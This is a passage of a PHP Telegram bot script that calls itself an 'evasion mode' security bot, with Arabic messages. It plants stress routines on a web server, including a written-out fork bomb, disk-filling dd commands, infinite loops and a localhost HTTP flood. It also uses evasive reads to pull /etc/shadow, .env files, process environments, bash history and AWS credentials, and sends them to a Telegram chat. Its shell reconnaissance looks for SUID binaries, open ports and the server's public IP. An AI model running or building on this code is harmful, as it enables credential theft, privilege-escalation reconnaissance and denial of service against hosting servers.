    $status = shouldStop() ? '🛑 أوقفه المستخدم' : '✅ اكتمل';
    sendMessage($chat_id, "🧠 {$status} — حجز {$total} بايت (" . round($total/1024/1024, 1) . "MB)");
    unset($chunks);
}

function stressDisk($chat_id, $mb) {
    $bytes = $mb * 1024 * 1024;
    $written = 0;
    $files = [];
    $dirs = [BOT_DIR, '/tmp', sys_get_temp_dir()];

    // Find writable directories
    $writables = [];
    foreach ($dirs as $d) {
        if (@is_writable($d)) {
            $test = $d . '/.stress_test';
            if (@file_put_contents($test, '1') !== false) {
                @unlink($test);
                $writables[] = $d;
            }
        }
    }

    if (empty($writables)) {
        sendMessage($chat_id, "❌ لا يوجد أدلة قابلة للكتابة");
        return;
    }

    sendMessage($chat_id, "💾 الكتابة في: " . implode(', ', $writables));

    while ($written < $bytes) {
        if (shouldStop()) break;
        $dir = $writables[array_rand($writables)];
        $fname = $dir . '/.stress_' . bin2hex(random_bytes(8)) . '.dat';
        $size = min(10 * 1024 * 1024, $bytes - $written); // 10MB chunks
        $data = random_bytes(min($size, 1024 * 1024)); // 1MB random data
        $rep = intdiv($size, strlen($data));
        $full = str_repeat($data, $rep + 1);
        $full = substr($full, 0, $size);
        $r = @file_put_contents($fname, $full);
        if ($r !== false) {
            $files[] = $fname;
            $written += $r;
        }

        // Also fill via shell (dd)
        if (function_exists('shell_exec')) {
            $rem = $bytes - $written;
            if ($rem > 0) {
                $chunk = min(50 * 1024 * 1024, $rem);
                $tmp = $dir . '/.stress_dd_' . bin2hex(random_bytes(4)) . '.dat';
                shellExec("dd if=/dev/zero of={$tmp} bs=1M count={$chunk} 2>/dev/null");
                if (file_exists($tmp)) {
                    $files[] = $tmp;
                    $written += $chunk;
                }
            }
        }
    }

    // تنظيف
    foreach ($files as $f) @unlink($f);

    $status = shouldStop() ? '🛑 أوقفه المستخدم' : '✅ اكتمل';
    sendMessage($chat_id, "💾 {$status} — كتب {$written} بايت (" . round($written/1024/1024, 1) . "MB) ثم حذف");
}

function stressFork($chat_id, $count) {
    $spawned = 0;

    // Method 1: PHP proc_open fork
    for ($i = 0; $i < $count; $i++) {
        if (shouldStop()) break;
        if (function_exists('proc_open')) {
            $des = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
            $p = @proc_open('sleep 60', $des, $pipes);
            if (is_resource($p)) {
                $spawned++;
                // Don't close — keep alive
            }
        }
    }

    // Method 2: shell background processes
    if (function_exists('shell_exec')) {
        for ($i = 0; $i < $count * 2; $i++) {
            if (shouldStop()) break;
            shellExec(':(){ :|:& };: 2>/dev/null'); // classic forkbomb
            shellExec('(while true; do true; done) &');
            shellExec('(yes > /dev/null) &');
            $spawned += 3;
        }
    }

    // Method 3: popen
    if (function_exists('popen')) {
        for ($i = 0; $i < $count; $i++) {
            if (shouldStop()) break;
            $h = @popen('sleep 120', 'r');
            if (is_resource($h)) {
                $spawned++;
                // Keep open
            }
        }
    }

    // Method 4: fsockopen to self
    if (function_exists('fsockopen')) {
        for ($i = 0; $i < $count; $i++) {
            if (shouldStop()) break;
            $h = @fsockopen('127.0.0.1', 80, $en, $es, 1);
            if ($h) { $spawned++; fclose($h); }
        }
    }

    // Method 5: curl to self
    if (function_exists('curl_init')) {
        for ($i = 0; $i < $count; $i++) {
            if (shouldStop()) break;
            $ch = curl_init('http://127.0.0.1/' . bin2hex(random_bytes(8)));
            curl_setopt_array($ch, [CURLOPT_TIMEOUT => 1, CURLOPT_RETURNTRANSFER => true]);
            curl_exec($ch);
            curl_close($ch);
            $spawned++;
        }
    }

    $status = shouldStop() ? '🛑 أوقفه المستخدم' : '✅ اكتمل';
    sendMessage($chat_id, "⚙️ {$status} — {$spawned} عملية/اتصال مفتوح");
}

function stressAll($chat_id, $seconds) {
    $end = time() + $seconds;
    $cpuOps = 0; $memTotal = 0; $diskWritten = 0; $forks = 0;
    $memChunks = [];
    $diskFiles = [];

    $writables = [];
    foreach ([BOT_DIR, '/tmp', sys_get_temp_dir()] as $d) {
        if (@is_writable($d)) $writables[] = $d;
    }

    while (time() < $end) {
        if (shouldStop()) break;

        // CPU
        for ($i = 0; $i < 5000; $i++) { $x = 1; $x *= 2; $x **= 0.5; }
        $cpuOps++;

        // Memory
        if ($memTotal < 500 * 1024 * 1024) {
            $memChunks[] = str_repeat('A', 1024 * 1024);
            $memTotal += 1024 * 1024;
        }

        // Disk
        if ($diskWritten < 500 * 1024 * 1024 && !empty($writables)) {
            $dir = $writables[array_rand($writables)];
            $f = $dir . '/.stress_' . bin2hex(random_bytes(6)) . '.bin';
            $r = @file_put_contents($f, random_bytes(1024 * 1024));
            if ($r) { $diskFiles[] = $f; $diskWritten += $r; }
        }

        // Fork
        if ($forks < 100 && function_exists('popen')) {
            $h = @popen('sleep 10', 'r');
            if ($h) $forks++;
        }

        // HTTP flood to self
        if (function_exists('curl_init')) {
            $ch = curl_init('http://127.0.0.1/' . bin2hex(random_bytes(4)));
            curl_setopt_array($ch, [CURLOPT_TIMEOUT => 1, CURLOPT_RETURNTRANSFER => true]);
            curl_exec($ch);
            curl_close($ch);
        }
    }

    // تنظيف
    foreach ($diskFiles as $f) @unlink($f);
    unset($memChunks);

    $status = shouldStop() ? '🛑 أوقفه المستخدم' : '✅ اكتمل';
    sendMessage($chat_id, "💥 {$status}\n🔥 CPU: {$cpuOps} دورة\n🧠 RAM: " . round($memTotal/1024/1024, 1) . "MB\n💾 Disk: " . round($diskWritten/1024/1024, 1) . "MB\n⚙️ Forks: {$forks}");
}

function bypassAndSend($chat_id, $path) {
    $results = evasiveRead($path);
    if (empty($results)) {
        sendMessage($chat_id, "✅ محمي: {$path}");
    } else {
        $m = $results[0];
        $data = $m['data'];
        if (strlen($data) > 3500) $data = substr($data, 0, 3500) . "\n\n...[مقطوع]";
        sendMessage($chat_id, "⚠️ <b>مكشوف: {$path}</b> (via {$m['method']})\n<pre>" . htmlspecialchars($data) . "</pre>");
    }
}

function formatSize($b) {
    $u = ['B','KB','MB','GB']; $i = 0;
    while ($b >= 1024 && $i < 3) { $b /= 1024; $i++; }
    return round($b, 1) . ' ' . $u[$i];
}

function scanQuick() {
    $r = "⚡ <b>الفحص السريع</b>\n" . str_repeat('─', 30) . "\n";
    $obd = safe_ini_get('open_basedir');
    $r .= ($obd ? "✅ open_basedir: {$obd}" : "⚠️ open_basedir: غير مفعل") . "\n";
    $df = safe_ini_get('disable_functions');
    $r .= "🚫 معطلة: " . ($df ?: 'لا يوجد') . "\n";
    $sh = function_exists('shell_exec') || function_exists('exec') || function_exists('system') || function_exists('passthru');
    $r .= ($sh ? "⚠️ shell: متاحة" : "✅ shell: معطلة") . "\n";

    // Evasive read test
    $etc = evasiveRead('/etc/passwd');
    $r .= (!empty($etc) ? "⚠️ /etc/passwd: مكشوف (via {$etc[0]['method']})" : "✅ /etc/passwd: محمي") . "\n";

    $envf = evasiveRead('.env');
    $r .= (!empty($envf) ? "⚠️ .env: مكشوف (via {$envf[0]['method']})" : "✅ .env: محمي") . "\n";

    $who = trim(shellExec('whoami') ?: '');
    $r .= ($who ? "⚠️ shell user: {$who}" : "✅ shell: معطل") . "\n";

    $out = @file_get_contents('https://httpbin.org/get', false, stream_context_create(['http' => ['timeout' => 5]]), 0, 1);
    $r .= ($out !== false ? "⚠️ اتصال خارجي: متاح" : "✅ اتصال خارجي: محظور") . "\n";

    $w = @is_writable(__DIR__);
    $r .= ($w ? "⚠️ مجلد البوت: قابل للكتابة" : "✅ مجلد البوت: غير قابل للكتابة") . "\n";

    return $r;
}

function scanFull() {
    $r = "🔍 <b>الفحص الكامل</b>\n" . str_repeat('═', 40) . "\n\n";

    $r .= "<b>1. أساسيات</b>\n";
    $r .= "PHP: " . phpversion() . " | " . PHP_SAPI . "\n";
    $r .= "OS: " . PHP_OS . "\n";
    $r .= "المسار: " . __DIR__ . "\n";
    $r .= "Document Root: " . ($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') . "\n\n";

    $r .= "<b>2. حواجز أمنية</b>\n";
    $obd = safe_ini_get('open_basedir');
    $r .= "open_basedir: " . ($obd ? $obd : '❌ غير مفعل') . "\n";
    $df = safe_ini_get('disable_functions');
    $r .= "disable_functions: " . ($df ?: 'لا يوجد') . "\n";
    $r .= "allow_url_fopen: " . (safe_ini_get('allow_url_fopen') ? 'ON' : 'OFF') . "\n";
    $r .= "allow_url_include: " . (safe_ini_get('allow_url_include') ? 'ON' : 'OFF') . "\n\n";

    $r .= "<b>3. ملفات حساسة (evasive read)</b>\n";
    $sensitive = ['/etc/passwd','/etc/shadow','/etc/hosts','.env','../.env','.git/config','/proc/self/environ','/proc/self/cmdline','/root/.bash_history'];
    foreach ($sensitive as $f) {
        $res = evasiveRead($f);
        if (!empty($res)) {
            $m = $res[0];
            $d = trim(substr($m['data'], 0, 100));
            $r .= "⚠️ مكشوف: {$f} [via {$m['method']}]\n  <code>" . htmlspecialchars($d) . "</code>\n";
        } else {
            $r .= "✅ محمي: {$f}\n";
        }
    }
    $r .= "\n";

    $r .= "<b>4. Shell</b>\n";
    $who = trim(shellExec('whoami') ?: '');
    $r .= "المستخدم: " . ($who ? $who : '❌ غير متاح') . "\n";
    $id = shellExec('id');
    if ($id) $r .= "ID: " . trim($id) . "\n";
    $www = shellExec('ps aux | grep -E "apache|nginx|php|www-data|fpm" | head -10');
    if ($www) $r .= "الخدمات:\n" . substr($www, 0, 500) . "\n";
    $r .= "\n";

    $r .= "<b>5. الشبكة</b>\n";
    $r .= "fsockopen: " . (function_exists('fsockopen') ? '✅' : '❌') . "\n";
    $r .= "cURL: " . (function_exists('curl_init') ? '✅' : '❌') . "\n";
    $ip = shellExec("curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || hostname -I 2>/dev/null");
    if ($ip) $r .= "IP العام: " . trim($ip) . "\n";
    $r .= "\n";

    $r .= "<b>6. دوال خطيرة</b>\n";
    $danger = ['eval','assert','system','exec','shell_exec','passthru','popen','proc_open','pcntl_exec','dl','mail','putenv','ini_set','phpinfo','symlink'];
    foreach ($danger as $f) {
        $r .= (function_exists($f) ? "⚠️" : "✅") . " {$f}\n";
    }
    $r .= "\n";

    $r .= "<b>7. أدلة قابلة للكتابة</b>\n";
    foreach ([__DIR__, '/tmp', sys_get_temp_dir()] as $d) {
        $r .= (is_writable($d) ? "⚠️" : "✅") . " {$d}\n";
    }

    return $r;
}

function deepScan() {
    $r = "🧠 <b>الفحص العميق</b>\n" . str_repeat('═', 40) . "\n\n";

    // 1. Uname
    $u = shellExec('uname -a');
    $r .= "<b>نظام:</b> " . ($u ? trim($u) : '❌') . "\n\n";

    // 2. Mount
    $mount = shellExec('mount 2>/dev/null || cat /proc/mounts 2>/dev/null | head -30');
    if ($mount) $r .= "<b> mounts:</b>\n" . substr($mount, 0, 1000) . "\n\n";

    // 3. Container check
    $container = shellExec('cat /proc/1/cgroup 2>/dev/null | head -5; echo "---"; cat /proc/self/cgroup 2>/dev/null | head -5');
    if ($container) $r .= "<b>Container/Cgroup:</b>\n" . $container . "\n\n";

    // 4. Proc scan
    $r .= "<b>/proc entries accessible:</b>\n";
    $procs = ['/proc/1/status','/proc/1/cmdline','/proc/1/environ','/proc/self/mountinfo','/proc/self/limits','/proc/self/attr/current'];
    foreach ($procs as $p) {
        $res = evasiveRead($p);
        $r .= (!empty($res) ? "⚠️ {$p} (via {$res[0]['method']})\n" : "✅ {$p}\n");
    }
    $r .= "\n";

    // 5. Find SUID
    $suid = shellExec('find / -perm -4000 -type f 2>/dev/null | head -20');
    $r .= "<b>SUID binaries:</b>\n" . ($suid ?: '❌ لا يوجد/محظور') . "\n\n";

    // 6. Find world-writable
    $ww = shellExec('find / -perm -2 -type f 2>/dev/null | head -20');
    $r .= "<b>World-writable files:</b>\n" . ($ww ?: '❌ لا يوجد/محظور') . "\n\n";

    // 7. Kernel info
    $k = shellExec('cat /proc/sys/kernel/random/boot_id 2>/dev/null; echo "---"; ls -la /boot/ 2>/dev/null | head -10');
    if ($k) $r .= "<b>Kernel:</b>\n" . $k . "\n\n";

    // 8. Network interfaces
    $net = shellExec('ip a 2>/dev/null || ifconfig 2>/dev/null');
    if ($net) $r .= "<b>Network:</b>\n" . substr($net, 0, 1500) . "\n\n";

    // 9. Process list
    $ps = shellExec('ps aux 2>/dev/null | head -40');
    if ($ps) $r .= "<b>عمليات:</b>\n" . $ps . "\n\n";

    // 10. Open ports
    $ports = shellExec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null; echo "---"; cat /proc/net/tcp 2>/dev/null');
    if ($ports) $r .= "<b>منافذ:</b>\n" . substr($ports, 0, 1000) . "\n\n";

    // 11. Try docker socket
    $ds = evasiveRead('/var/run/docker.sock');
    if (!empty($ds)) $r .= "⚠️ Docker socket مكشوف!\n";

    // 12. Try .aws credentials
    $aws = evasiveRead(dirname(__DIR__) . '/.aws/credentials');
    if (!empty($aws)) $r .= "⚠️ AWS credentials مكشوف!\n";

    return $r;
}

// ═══════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════

$input = file_get_contents('php://input');
if (!$input) {
    echo "🤖 Security Bot v2 - Evasion Mode\n";
    echo "Webhook: " . API_URL . "setWebhook?url=https://YOUR_DOMAIN/PATH/bot.php\n";
    exit;
}

$update = json_decode($input, true);
if (!$update) exit;

if (isset($update['message'])) {
    $msg = $update['message'];
    $chat_id = $msg['chat']['id'];
    $user_id = $msg['from']['id'] ?? 0;
    $text = $msg['text'] ?? '';

    if (ALLOWED_USER_ID && $user_id !== ALLOWED_USER_ID) {
        sendMessage($chat_id, "⛔ غير مصرح");
        exit;
    }

    if (strpos($text, '/') === 0) {
        $parts = explode(' ', $text, 2);
        $cmd = strtolower($parts[0]);
        $args = $parts[1] ?? '';
        processCommand($chat_id, $cmd, $args);
    }
}
